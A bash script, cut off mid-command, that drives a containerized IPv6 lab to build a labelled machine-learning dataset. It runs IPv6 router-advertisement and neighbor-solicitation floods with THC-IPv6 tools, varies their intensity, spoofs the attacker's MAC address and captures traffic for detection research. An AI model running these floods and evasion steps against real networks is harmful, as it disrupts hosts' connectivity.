#!/usr/bin/env bash

set -Eeuo pipefail

# =============================================================================
# Realistic IPv6 ND/RA dataset capture for ML  —  v4 (500+ MB target)
#
# ── v4 CHANGES (expanded dataset for XGBoost + Random Forest study) ─────────
#  VOL-8   Phase durations ~2.7× longer → ~2720s (~45 min) vs v3 ~1020s (17 min)
#  VOL-9   Three new attack phases: nd_slow_1, ra_attack_5, nd_attack_4
#           → adds low-and-slow ND variant + two more variable floods
#  VOL-10  Longer baselines (350s vs 120s) and recoveries (90–160s vs 25–60s)
#           → more Normal windows, better class balance for 10-feature models
#  VOL-11  tcpdump ring buffer 8192 → 16384 KB for sustained high-rate capture
#
# ── All v3 fixes retained ──────────────────────────────────────────────────
#  FIX-1 through FIX-19, GAP-A through GAP-F, BUG-1 through BUG-7,
#  NRM-A, NRM-C, NRM-E, VOL-1 through VOL-7
#
# ── PHASE TIMING (total ~2720s ≈ 45 min) ───────────────────────────────────
#
#   Phase                  Duration   Cumulative   Label
#   ─────────────────────  ────────   ──────────   ──────────
#   warmup                     20s         20s     Normal
#   baseline_1                350s        370s     Normal
#   ra_attack_1  (variable)    80s        450s     RA_Attack
#   recovery_1                160s        610s     Normal
#   nd_attack_1  (variable)    80s        690s     ND_Attack
#   recovery_2                160s        850s     Normal
#   ra_slow_1                 100s        950s     RA_Attack
#   recovery_3                130s       1080s     Normal
#   ra_attack_2  (variable)    80s       1160s     RA_Attack
#   recovery_4                120s       1280s     Normal
#   nd_attack_2  (variable)    80s       1360s     ND_Attack
#   recovery_5                 90s       1450s     Normal
#   ra_attack_4  (variable)    90s       1540s     RA_Attack
#   recovery_7                100s       1640s     Normal
#   nd_attack_3  (variable)    80s       1720s     ND_Attack
#   recovery_8                 90s       1810s     Normal
#   nd_slow_1                  75s       1885s     ND_Attack   ← NEW VOL-9
#   recovery_9                 90s       1975s     Normal      ← NEW VOL-9
#   ra_attack_5  (variable)    75s       2050s     RA_Attack   ← NEW VOL-9
#   recovery_10                80s       2130s     Normal      ← NEW VOL-9
#   combined_attack           100s       2230s     Combined_Attack
#   recovery_6                 60s       2290s     Normal
#   ra_attack_3  (straddles)  120s       2410s     RA_Attack
#   ra_slow_2                  75s       2485s     RA_Attack
#   nd_attack_4  (variable)    75s       2560s     ND_Attack   ← NEW VOL-9
#   recovery_11                70s       2630s     Normal      ← NEW VOL-9
#   baseline_final             90s       2720s     Normal
#   ─────────────────────  ────────   ──────────
#   Total                     2720s
#
# =============================================================================

LAB_PREFIX="clab-ipv6-research"
SWITCH="${LAB_PREFIX}-switch-br"
ROUTER="${LAB_PREFIX}-router"
ATTACKER="${LAB_PREFIX}-attacker"

VICTIM_NAMES=(
  victim  victim2  victim3  victim4  victim5  victim6
  victim7 victim8  victim9  victim10 victim11 victim12
  victim13 victim14 victim15 victim16 victim17 victim18
  victim19 victim20
)

ROUTER_IP="2001:db8::1"
ATTACKER_IP="2001:db8::100"
PREFIX_LEN="64"

CAPTURE_IF="br0"
CAPTURE_FILTER="icmp6"
ENABLE_IPERF=0

# ── Phase durations (seconds) — VOL-8/VOL-9/VOL-10 ──────────────────────────
WARMUP_SECS=20
BASELINE1_SECS=350
RA_ATTACK1_SECS=80
RECOVERY1_SECS=160
ND_ATTACK1_SECS=80
RECOVERY2_SECS=160
RA_SLOW1_SECS=100
RECOVERY3_SECS=130
RA_ATTACK2_SECS=80
RECOVERY4_SECS=120
ND_ATTACK2_SECS=80
RECOVERY5_SECS=90
RA_ATTACK4_SECS=90
RECOVERY7_SECS=100
ND_ATTACK3_SECS=80
RECOVERY8_SECS=90
# VOL-9: Three new attack phases
ND_SLOW1_SECS=75
RECOVERY9_SECS=90
RA_ATTACK5_SECS=75
RECOVERY10_SECS=80
COMBINED_SECS=100
RECOVERY6_SECS=60
RA_ATTACK3_SECS=120
RA_SLOW2_SECS=75
ND_ATTACK4_SECS=75
RECOVERY11_SECS=70
FINAL_NORMAL_SECS=90

PHASE_TOTAL=$(( WARMUP_SECS      + BASELINE1_SECS  \
              + RA_ATTACK1_SECS  + RECOVERY1_SECS  \
              + ND_ATTACK1_SECS  + RECOVERY2_SECS  \
              + RA_SLOW1_SECS    + RECOVERY3_SECS  \
              + RA_ATTACK2_SECS  + RECOVERY4_SECS  \
              + ND_ATTACK2_SECS  + RECOVERY5_SECS  \
              + RA_ATTACK4_SECS  + RECOVERY7_SECS  \
              + ND_ATTACK3_SECS  + RECOVERY8_SECS  \
              + ND_SLOW1_SECS    + RECOVERY9_SECS  \
              + RA_ATTACK5_SECS  + RECOVERY10_SECS \
              + COMBINED_SECS    + RECOVERY6_SECS  \
              + RA_ATTACK3_SECS  + RA_SLOW2_SECS   \
              + ND_ATTACK4_SECS  + RECOVERY11_SECS \
              + FINAL_NORMAL_SECS ))
BG_RUNTIME=$(( PHASE_TOTAL + 15 ))

SPLIT_80_S=$(( PHASE_TOTAL * 80 / 100 ))

COMBINED_START=$(( WARMUP_SECS     + BASELINE1_SECS  \
                 + RA_ATTACK1_SECS + RECOVERY1_SECS  \
                 + ND_ATTACK1_SECS + RECOVERY2_SECS  \
                 + RA_SLOW1_SECS   + RECOVERY3_SECS  \
                 + RA_ATTACK2_SECS + RECOVERY4_SECS  \
                 + ND_ATTACK2_SECS + RECOVERY5_SECS  \
                 + RA_ATTACK4_SECS + RECOVERY7_SECS  \
                 + ND_ATTACK3_SECS + RECOVERY8_SECS  \
                 + ND_SLOW1_SECS   + RECOVERY9_SECS  \
                 + RA_ATTACK5_SECS + RECOVERY10_SECS ))
COMBINED_END=$(( COMBINED_START + COMBINED_SECS ))

RA3_START=$(( COMBINED_END + RECOVERY6_SECS ))
RA3_END=$(( RA3_START + RA_ATTACK3_SECS ))

DATASET_ROOT="/mnt/d/ipv6_research"
RUN_ID="$(date +%Y%m%d_%H%M%S)"
OUTDIR="${DATASET_ROOT}/run_${RUN_ID}"
PCAP_CONTAINER="/tmp/data_capture.pcap"
PCAP_HOST="${OUTDIR}/raw_capture.pcap"
EVENTS_CSV="${OUTDIR}/events.csv"
NODES_CSV="${OUTDIR}/nodes.csv"
RUN_LOG="${OUTDIR}/run.log"

if [ ! -d "/mnt/d" ]; then
  echo "ERROR: /mnt/d is not mounted. Run: sudo mount -t drvfs D: /mnt/d" >&2
  exit 1
fi

mkdir -p "${OUTDIR}"
mkdir -p "${DATASET_ROOT}"
exec > >(tee -a "${RUN_LOG}") 2>&1

HOST_BG_PIDS=()
CAPTURE_STARTED=0
VICTIMS=()

for name in "${VICTIM_NAMES[@]}"; do
  VICTIMS+=("${LAB_PREFIX}-${name}")
done

IPERF_CLIENTS=(
  "${LAB_PREFIX}-victim"
  "${LAB_PREFIX}-victim4"
)

DELAY_A=(0.07 0.08 0.09 0.10 0.11 0.09 0.10 0.11
         0.12 0.08 0.12 0.13 0.07 0.09 0.08 0.10
         0.11 0.09 0.12 0.10)

DELAY_B=(0.18 0.20 0.22 0.25 0.28 0.19 0.22 0.24
         0.26 0.20 0.21 0.30 0.17 0.23 0.21 0.25
         0.22 0.27 0.19 0.28)

RS_INTERVALS=(5 6 7 8 9 10 11 5 7 6 8 9 5 6 7 8 9 6 7 8)

VICTIM_IPS=()
for idx in "${!VICTIM_NAMES[@]}"; do
  VICTIM_IPS+=("$(printf '2001:db8::%x' $(( idx + 2 )))")
done

ATTACKER_REAL_MAC=""

# =============================================================================
# HELPERS
# =============================================================================

log() {
  echo "[$(date '+%F %T')] $*"
}

record_event() {
  printf "%s,%s,%s,%s,%s\n" \
    "$(date +%s.%N)" "$1" "$2" "$3" "$4" >> "${EVENTS_CSV}"
}

docker_exec() {
  local container="$1"
  local cmd="$2"
  sudo docker exec "${container}" sh -lc "${cmd}"
}

ensure_switch_tcpdump() {
  sudo docker exec "${SWITCH}" sh -lc \
    'command -v tcpdump >/dev/null 2>&1 || apk add --no-cache tcpdump'
}

ensure_pkg() {
  local container="$1"
  local cmd_name="$2"
  local pkg_name="$3"
  sudo docker exec "${container}" sh -lc "
    command -v ${cmd_name} >/dev/null 2>&1 && exit 0
    if command -v apt-get >/dev/null 2>&1; then
      export DEBIAN_FRONTEND=noninteractive
      apt-get update -qq
      apt-get install -y -qq ${pkg_name}
    elif command -v apk >/dev/null 2>&1; then
      apk add --no-cache ${pkg_name}
    else
      echo 'ERROR: no supported package manager in ${container}' >&2
      exit 1
    fi
  "
}

rand_range() {
  local lo="$1"
  local hi="$2"
  local range=$(( hi - lo + 1 ))
  local max_unbiased=$(( 32768 - (32768 % range) ))
  local r
  while :; do
    r=$RANDOM
    [ "${r}" -lt "${max_unbiased}" ] && break
  done
  echo $(( lo + (r % range) ))
}

# =============================================================================
# CAPTURE — VOL-11: Ring buffer 16384 KB
# =============================================================================

start_capture() {
  log "Starting capture on ${SWITCH}:${CAPTURE_IF} filter='${CAPTURE_FILTER}' ..."
  sudo docker exec "${SWITCH}" rm -f "${PCAP_CONTAINER}"
  sudo docker exec -d "${SWITCH}" \
    tcpdump -i "${CAPTURE_IF}" -s 0 -B 16384 -U -n \
            -w "${PCAP_CONTAINER}" "${CAPTURE_FILTER}"
  CAPTURE_STARTED=1
  sleep 3
}

stop_capture() {
  if [ "${CAPTURE_STARTED}" -eq 1 ]; then
    log "Stopping capture ..."
    sudo docker exec "${SWITCH}" pkill -INT tcpdump >/dev/null 2>&1 || true
    CAPTURE_STARTED=0
    sleep 3
  fi
}

# =============================================================================
# RATE LIMITING
# =============================================================================

apply_rate_limit() {
  local rate="${1:-100mbit}"
  log "  Applying tc tbf rate=${rate} on attacker eth1 ..."
  sudo docker exec "${ATTACKER}" sh -lc "
    tc qdisc del dev eth1 root 2>/dev/null || true
    tc qdisc add dev eth1 root tbf rate ${rate} burst 200kb latency 50ms
  " >/dev/null 2>&1 \
    || log "WARNING: tc rate-limit failed — attack will run unthrottled"
}

remove_rate_limit() {
  sudo docker exec "${ATTACKER}" sh -lc "
    tc qdisc del dev eth1 root 2>/dev/null || true
  " >/dev/null 2>&1 || true
}

# =============================================================================
# GAP-A: MAC SPOOFING
# =============================================================================

spoof_attacker_mac() {
  local b1 b2 b3 b4 b5
  b1=$(rand_range 0 255)
  b2=$(rand_range 0 255)
  b3=$(rand_range 0 255)
  b4=$(rand_range 0 255)
  b5=$(rand_range 0 255)
  local spoof_mac
  spoof_mac="$(printf '02:%02x:%02x:%02x:%02x:%02x' \
    "${b1}" "${b2}" "${b3}" "${b4}" "${b5}")"

  log "  GAP-A: Attacker spoofing MAC → ${spoof_mac}"
  sudo docker exec "${ATTACKER}" sh -lc "
    ip link set eth1 down    2>/dev/null || true
    ip link set eth1 address ${spoof_mac} 2>/dev/null || true
    ip link set eth1 up      2>/dev/null || true
    ip -6 addr replace ${ATTACKER_IP}/${PREFIX_LEN} dev eth1 2>/dev/null || true
  " >/dev/null 2>&1 || log "WARNING: MAC spoof failed"
}

restore_attacker_mac() {
  if [ -z "${ATTACKER_REAL_MAC}" ]; then return; fi
  log "  GAP-A: Restoring attacker real MAC → ${ATTACKER_REAL_MAC}"
  sudo docker exec "${ATTACKER}" sh -lc "
    ip link set eth1 down    2>/dev/null || true
    ip link set eth1 address ${ATTACKER_REAL_MAC} 2>/dev/null || true
    ip link set eth1 up      2>/dev/null || true
    ip -6 addr replace ${ATTACKER_IP}/${PREFIX_LEN} dev eth1 2>/dev/null || true
  " >/dev/null 2>&1 || true
}

# =============================================================================
# CLEANUP
# =============================================================================

cleanup() {
  set +e
  log "Cleanup starting ..."
  stop_capture
  restore_attacker_mac

  for pid in "${HOST_BG_PIDS[@]:-}"; do
    kill "${pid}" >/dev/null 2>&1 || true
  done

  sudo docker exec "${ROUTER}" sh -lc '
    test -f /tmp/radvd.pid \
      && kill "$(cat /tmp/radvd.pid)" >/dev/null 2>&1 \
      || pkill radvd >/dev/null 2>&1 \
      || true
  ' >/dev/null 2>&1 || true

  sudo docker exec "${ATTACKER}" sh -lc '
    pkill -f atk6-flood_router26    >/dev/null 2>&1 || true
    pkill -f atk6-flood_solicitate6 >/dev/null 2>&1 || true
    tc qdisc del dev eth1 root      2>/dev/null     || true
  ' >/dev/null 2>&1 || true

  for container in "${VICTIMS[@]}"; do
    sudo docker exec "${container}" sh -lc '
      pkill -f ping6  >/dev/null 2>&1 || true
      pkill -f rdisc6 >/dev/null 2>&1 || true
    ' >/dev/null 2>&1 || true
  done

  log "Cleanup finished."
}

trap cleanup EXIT INT TERM

# =============================================================================
# BACKGROUND TRAFFIC LOOPS
# =============================================================================

start_ndp_loop() {
  local container="$1"
  local peer_ip="$2"
  local own_ip="$3"
  local d1="$4"
  local d2="$5"

  local d1_cs d2_cs
  d1_cs=$(printf '%.0f' "$(echo "${d1} * 100" | bc)")
  d2_cs=$(printf '%.0f' "$(echo "${d2} * 100" | bc)")

  sudo docker exec "${container}" timeout "${BG_RUNTIME}" sh -lc "
    d1_cs=${d1_cs}
    d2_cs=${d2_cs}
    dad_counter=0
    neigh_counter=0
    while :; do
      j1=\$(( d1_cs * (80 + (RANDOM % 41)) / 100 ))
      j2=\$(( d2_cs * (80 + (RANDOM % 41)) / 100 ))
      s1=\"\$(( j1 / 100 )).\$(printf '%02d' \$(( j1 % 100 )) )\"
      s2=\"\$(( j2 / 100 )).\$(printf '%02d' \$(( j2 % 100 )) )\"

      ping6 -c 1 -W 1 ${ROUTER_IP}        >/dev/null 2>&1 || true
      sleep \${s1}
      ping6 -c 1 -W 1 ${peer_ip}          >/dev/null 2>&1 || true
      sleep \${s2}
      ping6 -c 2 -W 1 ff02::1%eth1        >/dev/null 2>&1 || true

      neigh_counter=\$((neigh_counter + 1))
      if [ \"\${neigh_counter}\" -ge 80 ]; then
        ip -6 neigh flush dev eth1         >/dev/null 2>&1 || true
        neigh_counter=0
      fi

      dad_counter=\$((dad_counter + 1))
      if [ \"\${dad_counter}\" -ge 40 ]; then
        ip -6 addr flush dev eth1 scope global               >/dev/null 2>&1 || true
        ip -6 addr add ${own_ip}/${PREFIX_LEN} dev eth1      >/dev/null 2>&1 || true
        dad_counter=0
      fi
    done
  " >/dev/null 2>&1 &

  HOST_BG_PIDS+=("$!")
}

start_rs_loop() {
  local container="$1"
  local rs_interval="$2"

  sudo docker exec "${container}" timeout "${BG_RUNTIME}" sh -lc "
    while :; do
      sleep ${rs_interval}
      rdisc6 -1 eth1 >/dev/null 2>&1 || true
    done
  " >/dev/null 2>&1 &

  HOST_BG_PIDS+=("$!")
}

start_bursty_normal_loop() {
  local container="$1"

  sudo docker exec "${container}" timeout "${BG_RUNTIME}" sh -lc "
    while :; do
      count=\$(( (RANDOM % 15) + 2 ))
      ping6 -c \$count -i 0.05 -W 1 ff02::1%eth1 >/dev/null 2>&1 || true
      sleep_s=\$(( (RANDOM % 13) + 3 ))
      sleep \$sleep_s
    done
  " >/dev/null 2>&1 &

  HOST_BG_PIDS+=("$!")
}

start_random_peer_loop() {
  local container="$1"
  local own_ip="$2"

  local peer_list=""
  local ip
  for ip in "${VICTIM_IPS[@]}"; do
    [ "${ip}" = "${own_ip}" ] && continue
    peer_list="${peer_list} ${ip}"
  done
  peer_list="${peer_list# }"
  local n_peers
  n_peers=$(echo "${peer_list}" | wc -w)

  sudo docker exec "${container}" timeout "${BG_RUNTIME}" sh -lc "
    peers='${peer_list}'
    n=${n_peers}
    while :; do
      for peer in \$peers; do
        count=\$(( (RANDOM % 6) + 3 ))
        ping6 -c \$count -i 0.2 -W 1 \$peer >/dev/null 2>&1 || true
        sleep \$(( (RANDOM % 13) + 8 ))
      done
    done
  " >/dev/null 2>&1 &

  HOST_BG_PIDS+=("$!")
}

start_iperf_client() {
  local container="$1"
  local mode_flags="$2"
  local interval="$3"

  sudo docker exec "${container}" timeout "${BG_RUNTIME}" sh -lc "
    while :; do
      iperf3 -6 -c ${ROUTER_IP} ${mode_flags} -t 4 >/dev/null 2>&1 || true
      sleep ${interval}
    done
  " >/dev/null 2>&1 &

  HOST_BG_PIDS+=("$!")
}

# =============================================================================
# PHASE HELPERS
# =============================================================================

phase_sleep() {
  local secs="$1"
  local phase="$2"
  local label="$3"
  local notes="$4"

  log "Phase '${phase}' for ${secs}s ..."
  record_event "phase_start" "${phase}" "${label}" "${notes}"
  sleep "${secs}"
  record_event "phase_end" "${phase}" "${label}" "${notes}"
}

burst_ndp_reconvergence() {
  log "  Triggering NDP reconvergence burst (non-blocking) ..."
  for container in "${VICTIMS[@]}"; do
    sudo docker exec "${container}" sh -lc "
      ip -6 neigh flush dev eth1           >/dev/null 2>&1 || true
      rdisc6 -1 eth1                       >/dev/null 2>&1 || true
      ping6 -c 3 -i 0.1 -W 1 ${ROUTER_IP} >/dev/null 2>&1 || true
    " >/dev/null 2>&1 &
  done
  sleep 2
}

amplify_victim_traffic() {
  log "  Amplifying victim NDP reactions (all parallel, ≤3s) ..."
  for container in "${VICTIMS[@]}"; do
    sudo docker exec "${container}" sh -lc "
      for i in 1 2 3; do
        (
          sleep \$(( RANDOM % 2 ))
          rdisc6 -1 eth1                           >/dev/null 2>&1 || true
          ping6 -c 10 -i 0.05 ${ROUTER_IP}        >/dev/null 2>&1 || true
          ping6 -c 5  -i 0.05 ff02::1%eth1        >/dev/null 2>&1 || true
        ) &
      done
      wait
    " >/dev/null 2>&1 &
  done
  sleep 2
}

# =============================================================================
# ATTACK FUNCTIONS
# =============================================================================

run_attack_variable() {
  local total_secs="$1"
  local phase="$2"
  local label="$3"
  local flood_cmd="$4"
  local notes="$5"

  log "Attack '${phase}' (variable-intensity) for ${total_secs}s ..."
  record_event "phase_start" "${phase}" "${label}" "${notes}"

  local elapsed=0
  local sub=0
  while [ "${elapsed}" -lt "${total_secs}" ]; do
    sub=$(( sub + 1 ))
    local remaining=$(( total_secs - elapsed ))

    local burst_dur
    burst_dur=$(rand_range 3 10)
    [ "${burst_dur}" -gt "${remaining}" ] && burst_dur="${remaining}"

    local rate_mbit
    rate_mbit=$(rand_range 30 150)

    log "    sub-burst ${sub}: ${burst_dur}s @ ${rate_mbit}mbit ..."
    apply_rate_limit "${rate_mbit}mbit"
    sudo docker exec "${ATTACKER}" timeout "${burst_dur}" sh -lc \
      "${flood_cmd}" >/dev/null 2>&1 || true

    elapsed=$(( elapsed + burst_dur ))
    [ "${elapsed}" -ge "${total_secs}" ] && break

    local quiet_dur
    quiet_dur=$(rand_range 2 7)
    remaining=$(( total_secs - elapsed ))
    [ "${quiet_dur}" -gt "${remaining}" ] && quiet_dur="${remaining}"

    log "    sub-quiet ${sub}: ${quiet_dur}s ..."
    remove_rate_limit
    sleep "${quiet_dur}"
    elapsed=$(( elapsed + quiet_dur ))
  done

  remove_rate_limit
  record_event "phase_end" "${phase}" "${label}" "${notes}"
}

run_attack_slow() {
  local total_secs="$1"
  local phase="$2"
  local label="$3"
  local notes="$4"

  log "Attack '${phase}' (low-and-slow RA) for ${total_secs}s ..."
  record_event "phase_start" "${phase}" "${label}" "${notes}"

  sudo docker exec "${ATTACKER}" timeout "${total_secs}" sh -lc "
    while :; do
      timeout 1 atk6-flood_router26 eth1 >/dev/null 2>&1 || true
      sleep \$(( (RANDOM % 6) + 3 ))
    done
  " >/dev/null 2>&1 || true

  record_event "phase_end" "${phase}" "${label}" "${notes}"
}

# VOL-9: Low-and-slow ND attack (new in v4)
run_nd_attack_slow() {
  local total_secs="$1"
  local phase="$2"
  local label="$3"
  local notes="$4"

  log "Attack '${phase}' (low-and-slow ND) for ${total_secs}s ..."
  record_event "phase_start" "${phase}" "${label}" "${notes}"

  sudo docker exec "${ATTACKER}" timeout "${total_secs}" sh -lc "
    while :; do
      timeout 1 atk6-flood_solicitate6 eth1 >/dev/null 2>&1 || true
      sleep \$(( (RANDOM % 6) + 3 ))
    done
  " >/dev/null 2>&1 || true

  record_event "phase_end" "${phase}" "${label}" "${notes}"
}

run_combined_attack() {
  local total_secs="$1"
  local phase="$2"
  local label="$3"
  local notes="$4"

  log "Attack '${phase}' (combined RA+ND, variable) for ${total_secs}s ..."
  record_event "phase_start" "${phase}" "${label}" "${notes}"

  local elapsed=0
  local sub=0
  while [ "${elapsed}" -lt "${total_secs}" ]; do
    sub=$(( sub + 1 ))
    local remaining=$(( total_secs - elapsed ))

    local burst_dur
    burst_dur=$(rand_range 3 10)
    [ "${burst_dur}" -gt "${remaining}" ] && burst_dur="${remaining}"

    local rate_mbit
    rate_mbit=$(rand_range 25 120)

    log "    combined sub-burst ${sub}: ${burst_dur}s @ ${rate_mbit}mbit ..."
    apply_rate_limit "${rate_mbit}mbit"

    sudo docker exec "${ATTACKER}" sh -lc "
      atk6-flood_router26    eth1 & a=\$!
      atk6-flood_solicitate6 eth1 & b=\$!
      sleep ${burst_dur}
      kill \$a \$b 2>/dev/null || true
    " >/dev/null 2>&1 || true

    elapsed=$(( elapsed + burst_dur ))
    [ "${elapsed}" -ge "${total_secs}" ] && break

    local quiet_dur
    quiet_dur=$(rand_range 2 7)
    remaining=$(( total_secs - elapsed ))
    [ "${quiet_dur}" -gt "${remaining}" ] && quiet_dur="${remaining}"

    remove_rate_limit
    sleep "${quiet_dur}"
    elapsed=$(( elapsed + quiet_dur ))
  done

  remove_rate_limit
  record_event "phase_end" "${phase}" "${label}" "${notes}"
}

# =============================================================================
# STEP 0 — Provisioning
# =============================================================================

log "Step 0 - Provisioning tools ..."
log "  Capture filter  : ${CAPTURE_FILTER}"
log "  iperf3 enabled  : ${ENABLE_IPERF}"
log "  Victim count    : ${#VICTIMS[@]}"
log "  Total runtime   : ~${PHASE_TOTAL}s (~$(( PHASE_TOTAL / 60 )) min)"
log "  Dataset root    : ${DATASET_ROOT}"
log ""
log "  80% boundary validation:"
log "    Total duration    : ${PHASE_TOTAL}s"
log "    80% cut at        : ${SPLIT_80_S}s"
log "    combined_attack   : ${COMBINED_START}s → ${COMBINED_END}s"
log "    ra_attack_3       : ${RA3_START}s → ${RA3_END}s"
if [ "${SPLIT_80_S}" -gt "${COMBINED_START}" ] && \
   [ "${SPLIT_80_S}" -lt "${COMBINED_END}" ]; then
  log "    [OK] 80% cut inside combined_attack ✓"
elif [ "${SPLIT_80_S}" -gt "${RA3_START}" ] && \
     [ "${SPLIT_80_S}" -lt "${RA3_END}" ]; then
  log "    [OK] 80% cut inside ra_attack_3 ✓"
else
  log "    [WARN] 80% cut not inside any attack — check phase durations!"
fi

ensure_switch_tcpdump

ensure_pkg "${ATTACKER}" "atk6-flood_router26" "thc-ipv6"
ensure_pkg "${ATTACKER}" "ip"                  "iproute2"
ensure_pkg "${ATTACKER}" "bc"                  "bc"

ensure_pkg "${ROUTER}" "ip"     "iproute2"
ensure_pkg "${ROUTER}" "sysctl" "procps"
ensure_pkg "${ROUTER}" "radvd"  "radvd"

for container in "${VICTIMS[@]}"; do
  ensure_pkg "${container}" "rdisc6" "ndisc6"
  ensure_pkg "${container}" "ping6"  "iputils-ping"
  ensure_pkg "${container}" "bc"     "bc"
done

log "  Smoke-testing bc in all victim containers ..."
for container in "${VICTIMS[@]}"; do
  sudo docker exec "${container}" sh -lc 'echo "1*100" | bc' >/dev/null 2>&1 \
    || { log "FATAL: bc not working in ${container}"; exit 1; }
done
log "  bc smoke-test passed in all ${#VICTIMS[@]} victim containers."

if [ "${ENABLE_IPERF}" -eq 1 ]; then
  ensure_pkg "${ROUTER}" "iperf3" "iperf3"
  for container in "${IPERF_CLIENTS[@]}"; do
    ensure_pkg "${container}" "iperf3" "iperf3"
  done
fi

log "Provisioning complete."

# =============================================================================
# STEP 1 — IPv6 address assignment
# =============================================================================

log "Step 1 - Assigning deterministic IPv6 addresses ..."

docker_exec "${ROUTER}" "
  ip -6 addr flush dev eth1 scope global >/dev/null 2>&1 || true
  ip -6 addr replace ${ROUTER_IP}/${PREFIX_LEN} dev eth1
"

docker_exec "${ATTACKER}" "
  ip -6 addr flush dev eth1 scope global >/dev/null 2>&1 || true
  ip -6 addr replace ${ATTACKER_IP}/${PREFIX_LEN} dev eth1
"

for idx in "${!VICTIMS[@]}"; do
  container="${VICTIMS[$idx]}"
  ip="${VICTIM_IPS[$idx]}"
  docker_exec "${container}" "
    ip -6 addr flush dev eth1 scope global >/dev/null 2>&1 || true
    ip -6 addr replace ${ip}/${PREFIX_LEN} dev eth1
  "
done

for container in "${ROUTER}" "${ATTACKER}" "${VICTIMS[@]}"; do
  docker_exec "${container}" \
    "ip -6 neigh flush dev eth1 >/dev/null 2>&1 || true"
done

log "IPv6 addresses assigned."

# =============================================================================
# STEP 2 — Node identity metadata
# =============================================================================

log "Step 2 - Collecting node identity metadata ..."
printf "role,container,ipv6,mac\n" > "${NODES_CSV}"

ROUTER_MAC="$(sudo docker exec "${ROUTER}" \
  cat /sys/class/net/eth1/address | tr -d '\r')"
ATTACKER_REAL_MAC="$(sudo docker exec "${ATTACKER}" \
  cat /sys/class/net/eth1/address | tr -d '\r')"

printf "router,%s,%s,%s\n"   "${ROUTER}"   "${ROUTER_IP}"   "${ROUTER_MAC}"        >> "${NODES_CSV}"
printf "attacker,%s,%s,%s\n" "${ATTACKER}" "${ATTACKER_IP}" "${ATTACKER_REAL_MAC}" >> "${NODES_CSV}"

for idx in "${!VICTIMS[@]}"; do
  container="${VICTIMS[$idx]}"
  ip="${VICTIM_IPS[$idx]}"
  mac="$(sudo docker exec "${container}" \
    cat /sys/class/net/eth1/address | tr -d '\r')"
  printf "victim,%s,%s,%s\n" "${container}" "${ip}" "${mac}" >> "${NODES_CSV}"
done

log "  Router   MAC : ${ROUTER_MAC}"
log "  Attacker MAC : ${ATTACKER_REAL_MAC}"
log "  Victim count : ${#VICTIMS[@]}"

# =============================================================================
# STEP 3 — Router advertisements
# =============================================================================

log "Step 3 - Starting legitimate router advertisements ..."
docker_exec "${ROUTER}" "
  sysctl -w net.ipv6.conf.all.forwarding=1 >/dev/null 2>&1 || true
  cat >/tmp/radvd.conf <<'EOF'
interface eth1
{
  AdvSendAdvert on;
  MinRtrAdvInterval 3;
  MaxRtrAdvInterval 10;
  IgnoreIfMissing on;

  prefix 2001:db8::/64
  {
    AdvOnLink on;
    AdvAutonomous on;
    AdvValidLifetime 86400;
    AdvPreferredLifetime 14400;
  };
};
EOF
  pkill radvd >/dev/null 2>&1 || true
  radvd -C /tmp/radvd.conf -p /tmp/radvd.pid
"

sleep 2

sudo docker exec "${ROUTER}" sh -lc \
  'test -f /tmp/radvd.pid && kill -0 "$(cat /tmp/radvd.pid)" 2>/dev/null' \
  || { log "FATAL: radvd not running"; exit 1; }
log "  radvd health check passed."

if [ "${ENABLE_IPERF}" -eq 1 ]; then
  docker_exec "${ROUTER}" "pkill iperf3 >/dev/null 2>&1 || true; iperf3 -s -D -B ${ROUTER_IP}"
fi

# =============================================================================
# STEP 4 — Packet capture
# =============================================================================

printf "ts_epoch,event,phase,label,notes\n" > "${EVENTS_CSV}"
record_event "run_start" "setup" "N/A" "dataset run started"

log "Step 4 - Starting packet capture ..."
start_capture
record_event "capture_start" "setup" "N/A" "capture started"

# =============================================================================
# STEP 5 — Background benign traffic
# =============================================================================

log "Step 5 - Starting benign background traffic (${#VICTIMS[@]} victims) ..."
for idx in "${!VICTIMS[@]}"; do
  container="${VICTIMS[$idx]}"
  own_ip="${VICTIM_IPS[$idx]}"
  peer_idx=$(( (idx + 1) % ${#VICTIMS[@]} ))
  peer_ip="${VICTIM_IPS[$peer_idx]}"

  start_ndp_loop    "${container}" "${peer_ip}" "${own_ip}" \
                    "${DELAY_A[$idx]}" "${DELAY_B[$idx]}"
  start_rs_loop     "${container}" "${RS_INTERVALS[$idx]}"
  start_bursty_normal_loop "${container}"
  start_random_peer_loop   "${container}" "${own_ip}"
done

if [ "${ENABLE_IPERF}" -eq 1 ]; then
  start_iperf_client "${LAB_PREFIX}-victim"  ""            "19"
  start_iperf_client "${LAB_PREFIX}-victim4" "-u -b 750K" "23"
fi

# =============================================================================
# STEP 6 — Phased experiment
# =============================================================================

ATTACK_TOTAL=$(( RA_ATTACK1_SECS + ND_ATTACK1_SECS + RA_SLOW1_SECS  \
               + RA_ATTACK2_SECS + ND_ATTACK2_SECS                   \
               + RA_ATTACK4_SECS + ND_ATTACK3_SECS                   \
               + ND_SLOW1_SECS   + RA_ATTACK5_SECS                   \
               + COMBINED_SECS   + RA_ATTACK3_SECS + RA_SLOW2_SECS   \
               + ND_ATTACK4_SECS ))
NORMAL_TOTAL=$(( WARMUP_SECS     + BASELINE1_SECS  \
               + RECOVERY1_SECS  + RECOVERY2_SECS  \
               + RECOVERY3_SECS  + RECOVERY4_SECS  \
               + RECOVERY5_SECS  + RECOVERY7_SECS  \
               + RECOVERY8_SECS  + RECOVERY9_SECS  \
               + RECOVERY10_SECS + RECOVERY6_SECS  \
               + RECOVERY11_SECS + FINAL_NORMAL_SECS ))

log "Step 6 - Running phased experiment ..."
log "  Total          : ${PHASE_TOTAL}s (~$(( PHASE_TOTAL / 60 )) min)"
log "  Attack windows : ${ATTACK_TOTAL}s"
log "  Normal windows : ${NORMAL_TOTAL}s"
log "  80% test cut   : ${SPLIT_80_S}s"

# ── Normal: warmup + baseline ─────────────────────────────────────────────────
phase_sleep "${WARMUP_SECS}"    "warmup"     "Normal" "background startup no attack"
phase_sleep "${BASELINE1_SECS}" "baseline_1" "Normal" "benign RA NS NA and normal IPv6 traffic"

# ── RA Attack 1 ──────────────────────────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${RA_ATTACK1_SECS}" "ra_attack_1" "RA_Attack" \
  "atk6-flood_router26 eth1" "variable-rate RA flood"
restore_attacker_mac
burst_ndp_reconvergence
phase_sleep "${RECOVERY1_SECS}" "recovery_1" "Normal" "post RA1 recovery"

# ── ND Attack 1 ──────────────────────────────────────────────────────────────
spoof_attacker_mac
amplify_victim_traffic
run_attack_variable "${ND_ATTACK1_SECS}" "nd_attack_1" "ND_Attack" \
